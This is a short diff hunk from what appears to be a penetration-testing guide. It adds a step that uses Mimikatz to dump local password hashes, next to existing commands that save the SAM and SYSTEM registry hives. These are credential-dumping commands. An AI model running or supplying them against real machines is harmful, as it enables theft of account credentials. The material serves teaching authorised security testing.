@@ -559,6 +559,12 @@ reg save hklm\sam C:\Users\<username>\Desktop\SAM.hive
 reg save hklm\system C:\Users\<username>\Desktop\SYSTEM.hive
 ```
 
+If you have enough privilege, use Mimikatz to dump the hashes.
+
+```
+mimikatz64.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
+```
+
 ---
 
 # 29. Final Advice
